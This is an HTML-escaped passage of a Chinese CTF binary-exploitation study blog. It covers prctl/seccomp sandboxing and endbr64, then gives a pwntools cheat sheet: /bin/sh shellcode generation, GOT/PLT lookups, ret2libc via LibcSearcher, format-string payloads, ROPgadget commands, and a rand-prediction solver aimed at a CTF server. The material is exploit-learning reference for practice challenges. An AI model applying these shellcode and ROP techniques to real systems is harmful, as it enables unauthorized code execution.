class=&#34;hljs-type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;long&lt;/span&gt; arg2, &lt;span class=&#34;hljs-type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;long&lt;/span&gt; arg3, &lt;span class=&#34;hljs-type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;long&lt;/span&gt; arg4,&lt;span class=&#34;hljs-type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;long&lt;/span&gt; arg5)&lt;/span&gt;; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这个函数有 5 个参数，重点是 option 参数，这里主要关注 2 点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PR_SET_NO_NEW_PRIVS(38)&lt;/li&gt;
&lt;li&gt;PR_SET_SECCOMP(22)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;若option为PR_SET_NO_NEW_PRIVS(38)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第二个参数arg2设置为1，那么程序将不能通过执行execve系统调用来获得提权。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;若option为PR_SET_SECCOMP(22)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;表示可以设置沙箱规则，也就是可以自定义函数的系统调用是被允许还是禁止。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果arg2为SECCOMP_MODE_STRICT(1),则只允许调用read，write，_exit（not exit_group），sigreturn这几个syscall。&lt;/p&gt;
&lt;p&gt;如果arg2为SECCOMP_MODE_FILTER(2),则为过滤模式，其中对syscall的限制通过参数3的结构体，来自定义过滤规则。&lt;/p&gt;
&lt;p&gt;总结起来，就是prctl(38, 1LL, 0LL, 0LL, 0LL)表示禁用系统调用，也就是 system 和 onegadget 都没了,而 prctl(22，2) 表示设置沙箱规则，从而可以实现改变函数的系统调用。&lt;/p&gt;
&lt;h4 id=&#34;seccomp&#34;&gt;&lt;a href=&#34;#seccomp&#34; class=&#34;headerlink&#34; title=&#34;seccomp&#34;&gt;&lt;/a&gt;seccomp&lt;/h4&gt;&lt;p&gt;​	seccomp是 secure computing 的缩写，其是 Linux kernel 引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp 安全机制能使一个进程进入到一种 “安全” 运行模式。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;v1 = seccomp_init(&lt;span class=&#34;hljs-number&#34;&gt;0LL&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v1 )&lt;br&gt;{&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;seccomp error&#34;&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;}&lt;br&gt; &lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// seccomp_rule_add添加规则&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 第三个参数代表对应的系统调用号，0--&amp;gt;read/1--&amp;gt;write/2--&amp;gt;open/60--&amp;gt;exit&lt;/span&gt;&lt;br&gt;seccomp_rule_add(v1, &lt;span class=&#34;hljs-number&#34;&gt;0x7FFF0000&lt;/span&gt;LL, &lt;span class=&#34;hljs-number&#34;&gt;2LL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0LL&lt;/span&gt;);&lt;br&gt;seccomp_rule_add(v1, &lt;span class=&#34;hljs-number&#34;&gt;0x7FFF0000&lt;/span&gt;LL, &lt;span class=&#34;hljs-number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0LL&lt;/span&gt;);&lt;br&gt;seccomp_rule_add(v1, &lt;span class=&#34;hljs-number&#34;&gt;0x7FFF0000&lt;/span&gt;LL, &lt;span class=&#34;hljs-number&#34;&gt;1LL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0LL&lt;/span&gt;);&lt;br&gt;seccomp_rule_add(v1, &lt;span class=&#34;hljs-number&#34;&gt;0x7FFF0000&lt;/span&gt;LL, &lt;span class=&#34;hljs-number&#34;&gt;60LL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0LL&lt;/span&gt;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	首先调用seccomp_init(arg)对结构体进行初始化，若参数arg为SCMP_ACT_ALLOW(0x7fff0000U)，则为黑名单模式，没有匹配到规则的系统调用将被默认允许。若参数为SCMP_ACT_KILL(0x00000000U)，则为白名单模式，没有匹配到规则的系统调用都会杀死进程，默认不允许所有的syscall。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_45595732/article/details/125472253&#34;&gt;https://blog.csdn.net/qq_45595732/article/details/125472253&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs&#34;&gt;构造沙箱，检查沙箱工具&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;关于endbr64&#34;&gt;&lt;a href=&#34;#关于endbr64&#34; class=&#34;headerlink&#34; title=&#34;关于endbr64&#34;&gt;&lt;/a&gt;关于endbr64&lt;/h3&gt;&lt;p&gt;​	在间接跳转之后查看下一条指令是不是endbr64。如果指令是endbr64指令，那么该指令会将CPU状态从WAIT_FOR_ENDBRANCH恢复成DLE。另一方面，如果下一条指令不是endbr64，说明程序可能被控制流劫持了，CPU就报错（#CP）。因为按照正确的逻辑，&lt;strong&gt;间接跳转后应该需要有一条对应的endbr64指令来回应间接跳转，如果不是endbr64指令，那么程序控制流可能被劫持并前往其它地址&lt;/strong&gt;（其它任意地址上是以非endbr64开始的汇编代码）。&lt;/p&gt;
&lt;p&gt;​	这里关于间接跳转与直接跳转之间的区别，直接跳转是写死一个目标标签地址，间接跳转则是通过对一个标签指向的内容进行跳转&lt;/p&gt;
&lt;p&gt;​	简单来说就是intel新加的一条安全性检查的指令，大部分情况下视作nop即可，但这条指令事实上已用到最新版本的libc中，如果你的libc版本足够新且CPU也不是十多年前的古董的话大概率libc库函数第一条指令就是endbr 64，而这和服务器上是不一致，因此是有可能出现在本地打不通，在远程能够打通的情况。&lt;/p&gt;
&lt;h2 id=&#34;IDA操作&#34;&gt;&lt;a href=&#34;#IDA操作&#34; class=&#34;headerlink&#34; title=&#34;IDA操作&#34;&gt;&lt;/a&gt;IDA操作&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;有些字符串在数据段中，并不能通过字符串窗口&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;使用python打pwn&#34;&gt;&lt;a href=&#34;#使用python打pwn&#34; class=&#34;headerlink&#34; title=&#34;使用python打pwn&#34;&gt;&lt;/a&gt;使用python打pwn&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; * &lt;br&gt;p=process(&lt;span class=&#34;hljs-string&#34;&gt;&#39;./test&#39;&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# 本地打&lt;/span&gt;&lt;br&gt;p=remote(&lt;span class=&#34;hljs-string&#34;&gt;&#34;127.0.0.1&#34;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10011&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# 进行远程打&lt;/span&gt;&lt;br&gt;context.log_level = &lt;span class=&#34;hljs-string&#34;&gt;&#39;DEBUG&#39;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;#  设置调试标准&lt;/span&gt;&lt;br&gt;context(log_level=&lt;span class=&#34;hljs-string&#34;&gt;&#34;debug&#34;&lt;/span&gt;, arch=&lt;span class=&#34;hljs-string&#34;&gt;&#34;i386&#34;&lt;/span&gt;, os=&lt;span class=&#34;hljs-string&#34;&gt;&#34;linux&#34;&lt;/span&gt;)&lt;br&gt;gdb.attach(p) &lt;span class=&#34;hljs-comment&#34;&gt;# 使用gdb调试，这时候就会弹出一个gdb窗口&lt;/span&gt;&lt;br&gt;p.close() &lt;span class=&#34;hljs-comment&#34;&gt;# 关闭远程链接&lt;/span&gt;&lt;br&gt;p32(&lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# 将其变为一个32位的地址,注意使用的是小端序字节，不足32位的部分补0x00&lt;/span&gt;&lt;br&gt;p64(&lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# 与上面同理&lt;/span&gt;&lt;br&gt;p.sendline(parameter) &lt;span class=&#34;hljs-comment&#34;&gt;# 发送数据，默认后面加&#34;\n&#34;&lt;/span&gt;&lt;br&gt;p.recvuntil(“&lt;span class=&#34;hljs-built_in&#34;&gt;input&lt;/span&gt;:”)&lt;br&gt;send(payload) &lt;span class=&#34;hljs-comment&#34;&gt;# 发送payload&lt;/span&gt;&lt;br&gt;sendline(payload) &lt;span class=&#34;hljs-comment&#34;&gt;# 发送payload，并进行换行（末尾\n）&lt;/span&gt;&lt;br&gt;recvn(N) &lt;span class=&#34;hljs-comment&#34;&gt;# 接受 N(数字) 字符&lt;/span&gt;&lt;br&gt;recvline() &lt;span class=&#34;hljs-comment&#34;&gt;# 接收一行输出&lt;/span&gt;&lt;br&gt;recvlines(N) &lt;span class=&#34;hljs-comment&#34;&gt;# 接收 N(数字) 行输出&lt;/span&gt;&lt;br&gt;recvuntil(some_string) &lt;span class=&#34;hljs-comment&#34;&gt;# 接收到 some_string 为止&lt;/span&gt;&lt;br&gt;asm(&lt;span class=&#34;hljs-string&#34;&gt;&#39;mov eax, 0&#39;&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# 汇编成机器码,得到的是字节码&lt;/span&gt;&lt;br&gt;shellcraft.arm &lt;span class=&#34;hljs-comment&#34;&gt;# 是ARM架构的，&lt;/span&gt;&lt;br&gt;shellcraft.amd64&lt;span class=&#34;hljs-comment&#34;&gt;# 是AMD64架构，&lt;/span&gt;&lt;br&gt;shellcraft.i386&lt;span class=&#34;hljs-comment&#34;&gt;# 是Intel 80386架构的，&lt;/span&gt;&lt;br&gt;shellcraft.common&lt;span class=&#34;hljs-comment&#34;&gt;# 是所有架构通用的&lt;/span&gt;&lt;br&gt;asm(shellcraft.sh()) &lt;span class=&#34;hljs-comment&#34;&gt;# 生成/bin/sh 的shellcode&lt;/span&gt;&lt;br&gt;context(os=&lt;span class=&#34;hljs-string&#34;&gt;&#39;linux&#39;&lt;/span&gt;, arch=&lt;span class=&#34;hljs-string&#34;&gt;&#39;amd64&#39;&lt;/span&gt;, log_level=&lt;span class=&#34;hljs-string&#34;&gt;&#39;debug&#39;&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# 设置当前程序运行的上下文，如果是32位则这里设置为i386即可&lt;/span&gt;&lt;br&gt;c.interactive() &lt;span class=&#34;hljs-comment&#34;&gt;# 开始进行交互&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 不想去手动搞地址可以用pwntools帮忙搞&lt;/span&gt;&lt;br&gt;e = ELF(&lt;span class=&#34;hljs-string&#34;&gt;&#39;./example_file&#39;&lt;/span&gt;)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;hex&lt;/span&gt;(e.address)  &lt;span class=&#34;hljs-comment&#34;&gt;# 0x400000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;hex&lt;/span&gt;(e.symbols[&lt;span class=&#34;hljs-string&#34;&gt;&#39;write&#39;&lt;/span&gt;]) &lt;span class=&#34;hljs-comment&#34;&gt;# 0x401680&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;hex&lt;/span&gt;(e.got[&lt;span class=&#34;hljs-string&#34;&gt;&#39;write&#39;&lt;/span&gt;]) &lt;span class=&#34;hljs-comment&#34;&gt;# 输出got地址,为什么还没有运行就能知道got地址？这里其实是got表的地址，该地址的内容指向实际加载的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;hex&lt;/span&gt;(e.plt[&lt;span class=&#34;hljs-string&#34;&gt;&#39;write&#39;&lt;/span&gt;]) &lt;span class=&#34;hljs-comment&#34;&gt;# 输出plt地址，该内容中存储的是指向got地址&lt;/span&gt;&lt;br&gt;offset = e.symbols[&lt;span class=&#34;hljs-string&#34;&gt;&#39;system&#39;&lt;/span&gt;] - e.symbols[&lt;span class=&#34;hljs-string&#34;&gt;&#39;printf&#39;&lt;/span&gt;] &lt;span class=&#34;hljs-comment&#34;&gt;# calculate offset&lt;/span&gt;&lt;br&gt;binsh_address = &lt;span class=&#34;hljs-built_in&#34;&gt;next&lt;/span&gt;(e.search(&lt;span class=&#34;hljs-string&#34;&gt;&#39;/bin/sh\x00&#39;&lt;/span&gt;)) &lt;span class=&#34;hljs-comment&#34;&gt;# find address which contains /bin/sh&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 注意这里有个技巧，获取程序的输出&lt;/span&gt;&lt;br&gt;p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;&#34;secret[1] is&#34;&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# 这里有个技巧&lt;/span&gt;&lt;br&gt;v3_addr = &lt;span class=&#34;hljs-built_in&#34;&gt;int&lt;/span&gt;(p.recv(&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;),&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	使用给定的libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;br&gt;libc = ELF(&lt;span class=&#34;hljs-string&#34;&gt;&#34;./libc_32.so.6&#34;&lt;/span&gt;)&lt;br&gt;libc_write = libc.symbols[&lt;span class=&#34;hljs-string&#34;&gt;&#34;write&#34;&lt;/span&gt;]&lt;br&gt;libc_system = libc.symbols[&lt;span class=&#34;hljs-string&#34;&gt;&#34;system&#34;&lt;/span&gt;]&lt;br&gt;libc_bin_sh = &lt;span class=&#34;hljs-built_in&#34;&gt;next&lt;/span&gt;(libc.search(&lt;span class=&#34;hljs-string&#34;&gt;b&#34;/bin/sh\x00&#34;&lt;/span&gt;))&lt;br&gt;write_got=u32(sh.recv(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;)) &lt;span class=&#34;hljs-comment&#34;&gt;# 使用泄露出来的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#生成格式化字符串漏洞利用脚本&lt;/span&gt;&lt;br&gt;payload = fmtstr_payload(&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;,{printf_got:sys_plt}) &lt;span class=&#34;hljs-comment&#34;&gt;# 第一个参数是字符串的存储位置也就是这个AAAA&lt;/span&gt;&lt;br&gt;&lt;br&gt;ROPgadget --binary ret2libc3  --only &lt;span class=&#34;hljs-string&#34;&gt;&#39;pop|ret&#39;&lt;/span&gt;&lt;br&gt;ROPgadget --binary 文件名 --sting &lt;span class=&#34;hljs-string&#34;&gt;&#39;/bin/sh&#39;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	利用python调用libc中的函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 使用python调用libc中的函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; ctypes &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *&lt;br&gt;io = remote(&lt;span class=&#34;hljs-string&#34;&gt;&#39;220.249.52.133&#39;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;54835&lt;/span&gt;)&lt;br&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# 加载C动态链接库&lt;/span&gt;&lt;br&gt;libc = cdll.LoadLibrary(&lt;span class=&#34;hljs-string&#34;&gt;&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;&lt;/span&gt;)&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 调用函数库中的内容&lt;/span&gt;&lt;br&gt;libc.srand(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;):&lt;br&gt;    num = &lt;span class=&#34;hljs-built_in&#34;&gt;str&lt;/span&gt;(libc.rand()%&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;br&gt;    io.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;&#39;number:&#39;&lt;/span&gt;)&lt;br&gt;    io.sendline(num)&lt;br&gt;io.interactive()&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	无libc文件的时候怎么打ret2libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *&lt;br&gt;libc= LibcSearcher(&lt;span class=&#34;hljs-string&#34;&gt;&#34;read&#34;&lt;/span&gt;,read_libc) &lt;span class=&#34;hljs-comment&#34;&gt;# 这里泄露read函数地址，这里其实任何一个函数都可以，只要名称对应上即可&lt;/span&gt;&lt;br&gt;libc_base=read_libc-libc.dump(&lt;span class=&#34;hljs-string&#34;&gt;&#39;read&#39;&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# 这里是重定位后的地址减去在libc中的地址，得到基地址&lt;/span&gt;&lt;br&gt;&lt;br&gt;system_addr=p64(libc_base+libc.dump(&lt;span class=&#34;hljs-string&#34;&gt;&#39;system&#39;&lt;/span&gt;)) &lt;span class=&#34;hljs-comment&#34;&gt;# 这里得到的是system函数的地址&lt;/span&gt;&lt;br&gt;binsh_addr = p64(libc.dump(&lt;span class=&#34;hljs-string&#34;&gt;&#34;str_bin_sh&#34;&lt;/span&gt;) + libc_base) &lt;span class=&#34;hljs-comment&#34;&gt;# 这里找到binsh的地址&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span 